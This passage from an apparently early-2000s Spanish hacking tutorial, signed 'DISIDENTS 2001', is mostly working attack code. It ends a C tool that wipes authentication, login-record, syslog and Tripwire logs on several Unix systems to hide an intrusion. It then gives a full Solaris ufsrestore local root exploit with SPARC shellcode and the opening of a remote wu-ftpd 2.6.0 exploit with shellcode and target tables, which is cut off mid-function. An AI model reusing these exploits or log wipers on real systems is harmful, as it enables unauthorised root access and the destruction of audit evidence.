system("cat /dev/null  > /var/log/news/news.all");
system("cat /dev/null  > /var/log/news/news.crit");
system("cat /dev/null  > /var/log/news/news.err");
system("cat /dev/null  > /var/log/news/news.notice");
system("cat /dev/null  > /var/log/news/suck.err ");
system("cat /dev/null  > /var/log/news/suck.notice");
break;
case 'S':
system("echo eliminando logs de xmail");
system("cat /dev/null  > /var/spool/tmp");
system("cat /dev/null  > /var/spool/errors");
system("cat /dev/null  > /var/spool/logs");
system("cat /dev/null  > /var/spool/locks");
break;
case 'T':
system("echo eliminando logs de thttpd");
system("cat /dev/null  > /usr/local/www/logs/thttpd_log");
system("cat /dev/null  > /var/log/thttpd_log");
break;
case 'U':
system("echo eliminando logs de ncftpd");
system("cat /dev/null  > /var/log/ncftpd/%y%m%d/misc%H.%y%m%d");
system("cat /dev/null  > /var/log/ncftpd/misclog.txt");
system("cat /dev/null  > /var/log/ncftpd/stat.%Y%m");
system("cat /dev/null  > /var/log/ncftpd/%y%m%d/@SETNAME@/sess%H.%y%m%d");
system("cat /dev/null  > /var/log/ncftpd/sess.%y%m%d");
system("cat /dev/null  > /var/log/ncftpd.errs");
break;
case 'V':
system("echo eliminando logs de telnet");
system("cat /dev/null  > /var/log/telnet.log");
system("cat /dev/null  > /var/log/telnetd");
break;
case 'W':
system("echo eliminando logs de auth");
system("cat /dev/null  >  /var/log/auth.log ");
system("cat /dev/null  > /var/log/auth");
system("cat /dev/null  >  /var/adm/auth.log");
break;
case 'X':
system("echo eliminando logs de Tripwire");
system("cat /dev/null  >  /var/log/tripwire/agent.log ");
break;
case '1':
system("echo eliminando logs de sistema Solaris (SUN)");
system("echo eliminando /var/adm/messages");
system("cat /dev/null  > /var/adm/messages");
system("echo eliminando /var/adm/aculogs ");
system("cat /dev/null  > /var/adm/aculogs ");
system("echo eliminando /var/adm/aculog ");
system("cat /dev/null  > /var/adm/aculog ");
system("echo eliminando /var/adm/sulog");
system("cat /dev/null  > /var/adm/sulog ");
system("echo eliminando /var/adm/vold.log ");
system("cat /dev/null  > /var/adm/vold.log ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  > /var/adm/wtmp ");
system("echo eliminando /var/adm/wtmpx ");
system("cat /dev/null  > /var/adm/wtmpx ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null  > /var/adm/utmp ");
system("echo eliminando /var/adm/utmpx ");
system("cat /dev/null  > /var/adm/utmpx ");
system("echo eliminando /var/adm/log/asppp.log ");
system("cat /dev/null  > /var/adm/log/asppp.log ");
system("echo eliminando /var/log/syslog ");
system("cat /dev/null  > /var/log/syslog ");
system("echo eliminando /var/log/POPlog");
system("cat /dev/null  > /var/log/POPlog ");
system("echo eliminando /var/log/authlog ");
system("cat /dev/null  > /var/log/authlog ");
system("echo eliminando  /var/adm/pacct");
system("cat /dev/null  > /var/adm/pacct");
system("echo eliminando /var/lp/logs/lpsched ");
system("cat /dev/null  > /var/lp/logs/lpsched ");
system("echo eliminando /var/lp/logs/lpNet");
system("cat /dev/null  > /var/lp/logs/lpNet ");
system("echo eliminando /var/lp/logs/requests");
system("cat /dev/null  > /var/lp/logs/requests");
system("echo eliminando /var/cron/log ");
system("cat /dev/null  > /var/cron/log ");
system("echo eliminando /var/saf/_log ");
system("cat /dev/null  > /var/saf/_log ");
system("echo eliminando /var/saf/port/log");
system("cat /dev/null  > /var/saf/port/log");
break;
case '2':
system("echo eliminando logs de sistema HP");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  > /var/adm/sulog ");
system("echo eliminando /var/adm/btmp ");
system("cat /dev/null  > /var/adm/btmp > ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null > /var/adm/utmp > ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  > /var/adm/wtmp ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  > /var/adm/dtmp ");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  > /var/adm/pacct ");
system("echo eliminando /var/adm/nettl.LOG00");
system("cat /dev/null  > /var/adm/nettl.LOG00");
system("echo eliminando /var/adm/rbootd.log ");
system("cat /dev/null  > /var/adm/rbootd.log ");
system("echo eliminando /etc/rc.log ");
system("cat /dev/null  > /etc/rc.log ");
system("echo eliminando /var/adm/rpc.lockd.log ");
system("cat /dev/null  > /var/adm/rpc.lockd.log ");
system("echo eliminando /var/adm/rpc.statd.log ");
system("cat /dev/null  /var/adm/rpc.statd.log > ");
system("echo eliminando /etc/shutdownlog ");
system("cat /dev/null  > /etc/shutdownlog ");
system("echo eliminando /var/adm/snmpd.log ");
system("cat /dev/null  > /var/adm/snmpd.log ");
system("echo eliminando /var/adm/automount.log ");
system("cat /dev/null  > /var/adm/automount.log ");
system("echo eliminando /var/adm/syslog/boot ");
system("cat /dev/null  > /var/adm/syslog/boot ");
system("echo eliminando /var/adm/syslog/mail.log ");
system("cat /dev/null  > /var/adm/syslog/mail.log ");
system("echo eliminando /var/adm/syslog/syslog.log ");
system("cat /dev/null  > /var/adm/syslog/syslog.log ");
system("echo eliminando /var/adm/cron/log ");
system("cat /dev/null  > /var/adm/cron/log ");
system("echo eliminando /var/adm/sw/swagent.log ");
system("cat /dev/null  > /var/adm/sw/swagent.log ");
system("echo eliminando /var/spool/sw/swagent.log ");
system("cat /dev/null  > /var/spool/sw/swagent.log ");
system("echo eliminando /var/adm/sw/swagentd.log ");
system("cat /dev/null  > /var/adm/sw/swagentd.log ");
system("echo eliminando /var/adm/sw/swconfig.log");
system("cat /dev/null  >  /var/adm/sw/swconfig.log ");
system("echo eliminando /var/adm/sw/swinstall.log ");
system("cat /dev/null  >  /var/adm/sw/swinstall.log ");
system("echo eliminando /var/adm/sw/swmodify.log ");
system("cat /dev/null  >  /var/adm/sw/swmodify.log ");
system("echo eliminando /var/adm/sw/swremove.log ");
system("cat /dev/null  >  /var/adm/sw/swremove.log ");
system("echo eliminando /var/adm/lp/log ");
system("cat /dev/null  >  /var/adm/lp/log ");
system("echo eliminando /var/adm/lp/lpd.log ");
system("cat /dev/null  >  /var/adm/lp/lpd.log ");
system("echo eliminando /usr/spool/mqueue/POPlog ");
system("cat /dev/null  > /usr/spool/mqueue/POPlog  ");
break;
case '3':
system("echo eliminando logs de sistema IRIX (Silicon Graphics)");
system("echo eliminando /var/adm/SYSLOG ");
system("cat /dev/null  >  /var/adm/SYSLOG ");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  >  /var/adm/sulog ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null  >  /var/adm/utmp ");
system("echo eliminando /var/adm/utmpx ");
system("cat /dev/null  >  /var/adm/utmpx ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  >  /var/adm/wtmp ");
system("echo eliminando /var/adm/wtmpx ");
system("cat /dev/null  >  /var/adm/wtmpx ");
system("echo eliminando /var/adm/lastlog/username ");
system("cat /dev/null  >  /var/adm/lastlog/username ");
system("echo eliminando /usr/spool/lp/log ");
system("cat /dev/null  >  /usr/spool/lp/log ");
system("echo eliminando /var/adm/lp/lpd-errs ");
system("cat /dev/null  > /var/adm/lp/lpd-errs  ");
system("echo eliminando /usr/lib/cron/log ");
system("cat /dev/null  >  /usr/lib/cron/log ");
system("echo eliminando /var/adm/loginlog ");
system("cat /dev/null  >  /var/adm/loginlog ");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  >  /var/adm/pacct ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  >  /var/adm/dtmp ");
system("echo eliminando /var/adm/acct/sum/loginlog ");
system("cat /dev/null  >  /var/adm/acct/sum/loginlog ");
system("echo eliminando /var/adm/X0msgs ");
system("cat /dev/null  >  /var/adm/X0msgs ");
system("echo eliminando /var/adm/crash/vmcore ");
system("cat /dev/null  >  /var/adm/crash/vmcore ");
system("echo eliminando /var/adm/crash/unix ");
system("cat /dev/null  >  /var/adm/crash/unix");
break;
case '4':
system("echo eliminando logs de sistema AIX (IBM)");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  >  /var/adm/pacct ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  >  /var/adm/wtmp ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  >  /var/adm/dtmp ");
system("echo eliminando /var/adm/qacct ");
system("cat /dev/null  >  /var/adm/qacct ");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  >  /var/adm/sulog ");
system("echo eliminando /var/adm/ras/errlog ");
system("cat /dev/null  >  /var/adm/ras/errlog ");
system("echo eliminando /var/adm/ras/bootlog ");
system("cat /dev/null  > /var/adm/ras/bootlog  ");
system("echo eliminando /var/adm/cron/log  ");
system("cat /dev/null  >  /var/adm/cron/log ");
system("echo eliminando /etc/utmp ");
system("cat /dev/null  >  /etc/utmp ");
system("echo eliminando /etc/security/lastlog ");
system("cat /dev/null  > /etc/security/lastlog  ");
system("echo eliminando /etc/security/failedlogin ");
system("cat /dev/null  > /etc/security/failedlogin  ");
system("echo eliminando /usr/spool/mqueue/syslog ");
system("cat /dev/null  >  /usr/spool/mqueue/syslog ");
break;
case '5':
system ("clear");
printf("\n\033[1;30m  \n");
printf("                    ---------  ------- ----------------\n");
printf("       --------------------   -------   ----------------------\n");
printf(" -----------------------               -------------------------\n");
printf("-------------------------          ------------------------------\n");
printf(" ----------------                             ------------------\n");
printf("    ----------------------------------------------------\n");
printf("           ------------------------------------\n");
printf("\n\033[1;31mDISIDENTS 2001 - LOS FUERA DE LA LEY\033[0;0m\n");
return 0;
}
}


<-->


Este  es  otro  exploit, este en  concreto  es  para  el  sistema  operativo
Solaris 8 (sparc), por eso  decimos  que  no  todos  sirven  para  todos, en
enconcreto todo lo contrario,cada uno para el suyo ...XDdd

#!/bin/sh
# Affected:
#  Sun Solaris 8.0
#  Sun Solaris 7.0
#  Sun Solaris 2.6

/bin/rm -f /var/tmp/dumpufs
/bin/rm -rf /var/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd /var/tmp
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
touch a
/usr/lib/fs/ufs/ufsdump f /var/tmp/dumpufs ./a
cd /var/tmp
/bin/rm -rf /var/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
chmod a+r /var/tmp/dumpufs

cat << _EOF_ > ufsroot.c


#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;unistd.h>
#include &lt;string.h>
#include &lt;sys/systeminfo.h>
#include &lt;sys/types.h>
#include &lt;sys/stack.h>
#include &lt;procfs.h>
#include &lt;fcntl.h>

#define PROG "/usr/lib/fs/ufs/ufsrestore"

#define SHELLCODE_OFFSET	60
#define FP_OFFSET		1280

char sparc_shellcode[] =
"EXPLOIT=xxxxxxxx"
"\x82\x10\x20\x17\x91\xd0\x20\x08\x9a\x03\xe0\x08\xda\x23\xbf\xf4"
"\x9a\x03\xe0\x13\xda\x23\xbf\xf8\xd0\x23\xbf\xfc\xd0\x2b\xe0\x12"
"\xd0\x03\xbf\xf4\x92\x23\xa0\x0c\x94\x23\xa0\x04\x82\x10\x20\x3b"
"\x91\xd0\x20\x08\x7f\xff\xff\xf3\x90\x1a\x40\x09\x2f\x62\x69\x6e"
"\x2f\x74\x6f\x75\x63\x68\x58\x2f\x74\x6d\x70\x2f\x72\x6f\x6f\x74"
"\x5f\x77\x61\x73\x5f\x68\x65\x72\x65\x00";

char pad1[] =
"PAD0001=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

char pad2[] =
"PAD0002=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";


main()
{
    char *args[4], *envs[5], prog[1024], platform[1024], pathpstatus[1024];
    int argc, envc, len, len2, len3, fd, off, totlen;
    pstatus_t pstatus;
    u_long stacktop, stackstart;
    pid_t pid;
    int mypipe[2];
    FILE *fp;

    /*
     *Tratar de estimar la pila exactamente  para que seamos independientes
     *de la plataforma y arco. No tengo ni idea de que haga buena causa
     * tengo pruebas limitadas de plataforma .
    */

    if (sysinfo(SI_PLATFORM, platform, sizeof(platform))<0) {
        perror("sysinfo");
        exit(1);
    }

    realpath(PROG,prog);

    args[0] = strdup("ufsrestore");
    args[1] = strdup("if");
    args[2] = strdup("/var/tmp/dumpufs");
    args[3] = NULL;

    len2 = strlen(platform) + 1 + strlen(prog) + 1;
    len2 = (len2 + 3) & ~3;

    pad2[ 243 - (len2 + strlen(sparc_shellcode) + 1) ] = '\0';

    envs[0] = strdup(pad1);
    envs[1] = strdup(sparc_shellcode);
    envs[2] = strdup(pad2);
    envs[3] = NULL;

    len = 0;
    argc = 0;
    while (args[argc] != NULL)
         len += strlen(args[argc++]) + 1;

    envc=0;
    len3 = 0;
    while (envs[envc] != NULL)
         len3 += strlen(envs[envc++]) + 1;


  /*
   *Tratar de calcular las longitudes y tama±o .Informacion
   *en puedes o puede ser encontrado en /usr/include/sys/* . aun asi
   *Es un poco de magia .Algunas cosas cambian con solo 8 . Otravez el rellono es
   *usado para crear precendible localisacion del codigo de shell.


    envs[0][ 255 - (len + (argc + envc + 4) * 4)] = '\0';

    /* calculate the offset of the shell code */
    off = len + (argc + envc + 3) * 4 + strlen(envs[0]) + 1 + SHELLCODE_OFFSET;

    len = ((len3 - ((argc + envc + 4) * 4) + 3) & ~3) + 4;
    len += len2;

    /* Calcular el tama±o total del banco de datos de la pila.SA is still arch
     * dependiendo (32/64bit) so this part still needs to determine the correct
     * size.
     */
    totlen = SA(len + (argc + envc + 4) * 4);

      /*
        *coje la pila de arriba.No sabia de que otra forma cogerla
        *La idea es que puedes compilar el binario y usarlo en cualquier arco.
      */

    sprintf(pathpstatus,"/proc/%d/status",getpid());

    if ((fd = open(pathpstatus, O_RDONLY)) < 0 ) {
        perror(pathpstatus);
        exit(1);
    }

    if (read(fd, &pstatus, sizeof (pstatus)) < 0 ) {
        (void) close(fd);
        perror("read");
        exit(1);
    }

    stacktop = pstatus.pr_stkbase + pstatus.pr_stksize;
    stackstart = stacktop - totlen;
    (void) close(fd);

    /* Create the pipe. */
    if (pipe (mypipe)) {
        fprintf (stderr, "Pipe failed.\n");
        return EXIT_FAILURE;
    }

    /* Create the child process. */
    pid = fork ();
    if (pid == (pid_t) 0) {
        /* This is the child process. */
        close(STDIN_FILENO);
        dup2(mypipe[0], STDIN_FILENO);
        close(STDOUT_FILENO);
        dup2(mypipe[1], STDOUT_FILENO);
        close(STDERR_FILENO);
        execve(prog, args, envs);
        return EXIT_SUCCESS;
    } else if (pid < (pid_t) 0) {
        /* The fork failed. */
        fprintf (stderr, "Fork failed.\n");
        return EXIT_FAILURE;
    } else {
        /* This is the parent process. */
        char buf[256];
        unsigned long ptr;

   /*ve a modo interactivo con  ufsrestore y ve al paso largo
    * luego da el comando X para esforsar a ufsrestore para
    *regresar  a auto a pagar el comando bucle  y a la misma ves indicar o
    *modificar el paso del buffer*/


        fp = fdopen(mypipe[1],"w");
        fprintf(fp,"cd /var/tmp/a*/a*/a*/a*\n");fflush(fp);
        sprintf(buf,"x ../../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
        ptr = stackstart - FP_OFFSET;
        *(long *)&buf[strlen(buf)-33] = ptr;
        *(long *)&buf[strlen(buf)-9]  = ptr;
        ptr = stackstart + off;
        *(long *)&buf[strlen(buf)-5]  = ptr;
        fprintf(fp,buf);fflush(fp);
        return EXIT_SUCCESS;
    }
}
EOF
gcc ufsroot.c -o ufsroot
./ufsroot


Este otro  en concreto es otro bug pero esta vez del  SO mandrake 7.1 , pero
bueno esto son solo algunos para que veais como van, si necesitais alguno en
concreto  buscarlo que seguro que existe algun bug y exploit para  ese SO en
concreto o para esa aplicaci≤n, con esto se va despidiendo mitr3in, ahφí vßí


#include &lt;stdio.h>
#include &lt;string.h>
#include &lt;stdlib.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;sys/time.h>
#include &lt;netdb.h>
#include &lt;unistd.h>
#include &lt;netinet/in.h>
#include &lt;arpa/inet.h>
#include &lt;signal.h>
#include &lt;errno.h>

#ifdef __linux
#include &lt;getopt.h>
#endif

#define MAKE_STR_FROM_RET(x) ((x)&0xff),(((x)&0xff00)>>8),(((x)&0xff0000)>>16),(((x)&0xff000000)>>24)
#define GREEN "\033[32m"
#define RED "\033[31m"
#define NORM "\033[0m"

char infin_loop[]= /* for testing purposes */
  "\xEB\xFE";

char bsdcode[] = /* Lam3rZ chroot() code rewritten for FreeBSD by venglin */
  "\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43"
  "\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0"
  "\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\xff\x01\x53\x53\xb0"
  "\x88\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80"
  "\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9"
  "\x31\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75"
  "\xf1\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd"
  "\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46"
  "\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56"
  "\x0c\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53"
  "\x53\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\xff\xff\xff\x30"
  "\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e"
  "\x67\x6c\x69\x6e";

char bsd_code_d[]= /* you should call it directly (no jump/call)*/
  "\xEB\xFE\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5C"
  "\x8B\x74\x24\xFC\x31\xC9\xB1\x15\x01\xCE\xB1\x71\xB0\xEF"
  "\x30\x06\x8D\x76\x01\xE2\xF9\xDE\x26\xDE\x2F\xBE\x5F\xF8"
  "\xBF\x22\x6F\x5F\xB5\xEB\xB4\xBE\xBF\x22\x6F\x62\xB9\x14"
  "\x87\x75\xED\xEF\xEF\xBD\x5F\x67\xBF\x22\x6F\x62\xB9\x11"
  "\xBE\xBD\x5F\xEA\xBF\x22\x6F\x66\x2C\x62\xB9\x14\xBD\x5F"
  "\xD2\xBF\x22\x6F\xBC\x5F\xE2\xBF\x22\x6F\x5C\x11\x62\xB9"
  "\x12\x5F\xE3\xBD\xBF\x22\x6F\x11\x24\x9A\x1C\x62\xB9\x11"
  "\xBD\x5F\xD2\xBF\x22\x6F\x62\x99\x12\x66\xA1\xEB\x62\xB9"
  "\x17\x66\xF9\xB9\xB9\xBD\x5F\xD4\xBF\x22\x6F\xC0\x8D\x86"
  "\x81\xC0\x9C\x87\xEF\xC1\xC1\xEF";

char linuxcode[]= /* Lam3rZ chroot() code */
  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
  "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
  "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"
  "\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"
  "\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"
  "\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"
  "\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"
  "\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  "\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"
  "\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31";

#define MAX_FAILED      4
#define MAX_MAGIC       100
static int magic[MAX_MAGIC],magic_d[MAX_MAGIC];
static char *magic_str=NULL;
int before_len=0;
char *target=NULL,*username="ftp",*password=NULL;
struct targets getit;

struct targets
  {
    int def;
    char *os_descr, *shellcode;
    int delay;
    u_long pass_addr, addr_ret_addr;
    int magic[MAX_MAGIC], magic_d[MAX_MAGIC],islinux;
  };

struct targets targ[]=
    {
      {
        0,"RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8075b00-700,0xbfffb028,{0x87,3,1,2},{1,2,1,4},1
      },
      {1,"RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8075b00-700,0xbfffb038,{0x87,3,1,2},{1,2,1,4},1},
      {2,"SuSe 6.3 with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8076cb0-400,0xbfffb018,{0x87,3,1,2},{1,2,1,4},1},
      {3,"SuSe 6.4 with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8076920-400,0xbfffafec,{0x88,3,1,2},{1,2,1,4},1},
      {4,"RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm (test)",linuxcode,2,0x8075b00-700,0xbfffb070,{0x87,3,1,2},{1,2,1,4},1},

      {5,"FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from ports",bsdcode,10,0x80bb474-100, 0xbfbfc164,{0x3b,2,4,1,0x44,2,1,2},{1,2,1,2,1,2,1,4},0},
      {6,"FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from packages",bsdcode,2,0x806d5b0-500,0xbfbfc6bc, {0x84,1,2,1,2}, {1,3,2,1,4},0},
      {7,"FreeBSD 3.4-RELEASE with wuftpd 2.6.0(1) from ports",bsdcode,2,0x80a4dec-400,0xbfbfc624,{0x3B,2,1,0xe,0x40,1,2,1,2},{1,2,1,2,1,3,2,1,4},0},
      {8,"FreeBSD 4.0-RELEASE with wuftpd 2.6.0(1) from packages",infin_loop,2,0x80706f0,0xbfbfe798,{0x88,2,1,2},{1,2,1,4},0},
      {0,NULL,NULL,0,0,0,{0},{0},0}
    };

void usage(char*zu,int q)
{
  int i, n, padding;
  fprintf(stderr,"Usage: %s -t &lt;target> [-l user/pass] [-s systype] [-o offset] [-g] [-h] [-x]\n"
          "         [-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir]\n"
          "target    : host with any wuftpd\nuser      : anonymous user\n"
          "dir       : if not anonymous user, you need to have writable directory\n"
          "magic_str : magic string (see exploit description)\n-g        : enables magic string digging\n"
          "-x        : enables test mode\npass_addr : pointer to setproctitle argument\n"
          "ret_addr  : this is pointer to shellcode\nsystypes: \n",zu);
  for(i=0;targ[i].os_descr!=NULL;i++)
    {
      padding=0;
      fprintf(stderr,"%s%2d - %s\n",targ[i].def?"*":" ",i,targ[i].os_descr);
      if(q>1)
        {
          fprintf(stderr,"     Magic ID: [");
          for(n=0;targ[i].magic[n]!=0;n++)
            {
              if(targ[i].magic_d[n]==4)
                padding=targ[i].magic[n];
              fprintf(stderr,"%02X,%02X",targ[i].magic[n],targ[i].magic_d[n]);
              if(targ[i].magic[n+1]!=0)
                fprintf(stderr,":");
            }
          fprintf(stderr,"] Padding: %d\n",padding);
          fflush(stderr);
        }
    }
  exit(1);
}

int connect_to_server(char*host)
{
  struct hostent *hp;
  struct sockaddr_in cl;
  int sock;

  if(host==NULL||*host==(char)0)
    {
      fprintf(stderr,"Invalid hostname\n");
      exit(1);
    }
  if((cl.sin_addr.s_addr=inet_addr(host))==-1)
    {
      if((hp=gethostbyname(host))==NULL)
        {
          fprintf(stderr,"Cannot resolve %s\n",host);
          exit(1);
        }
      memcpy((char*)&cl.sin_addr,(char*)hp->h_addr,sizeof(cl.sin_addr));
